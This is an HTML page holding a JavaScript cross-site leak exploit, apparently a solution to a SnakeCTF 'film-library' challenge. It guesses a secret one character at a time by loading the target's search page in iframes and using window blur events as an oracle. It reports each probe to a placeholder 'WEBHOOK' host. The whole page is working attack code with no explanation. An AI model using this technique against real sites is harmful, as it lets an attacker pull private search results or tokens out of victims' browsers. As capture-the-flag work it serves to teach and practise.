<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

</head>
<body>
<script>
    const leak = async (url) => {
        return new Promise(r => {
            let iframe = document.createElement('iframe')
    
            window.onblur = async () => {
                console.debug('onblur fired')
                window.onblur = ''
                await sleep(10)
                iframe.remove()
                return r(1)
            }
    
            setTimeout(() => {
                window.onblur = ''
                iframe.remove()
                return r(0)
            }, 500)
    
    
    
            iframe.src = `${url}#film-0`
    
            document.body.appendChild(iframe)
        })
    }
    
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

    const CHALLENGE_URL = "https://xxxxxxxx.film-library.challs.snakectf.org";

    const ALPHA = '_stuabcdef0123456789ghijklmnopqrvwxyz{}ABCDEFGHIJKLMNOPQRSTUVWXYZ!\'()*+,-./:_<=>?@[\\]^$`|~ "#%&\t\n\r\x0b\x0c';

    GUESS = window.location.hash.slice(1);

    const START =  0;
    async function main(){
        await sleep(100);
        
        for(let i = START; i < ALPHA.length; i++){
            fetch("https://WEBHOOK/?skillissue=" + encodeURI(ALPHA[i]),{mode: "no-cors"});
            if(await leak(`${CHALLENGE_URL}/search?filter=${GUESS + ALPHA[i]}`)){
                window.location.hash = "#"+ALPHA[i]+"!";
                return;
                break;
                
            }
        }
    }

    document.addEventListener("DOMContentLoaded", main);



</script> 
</body>
</html>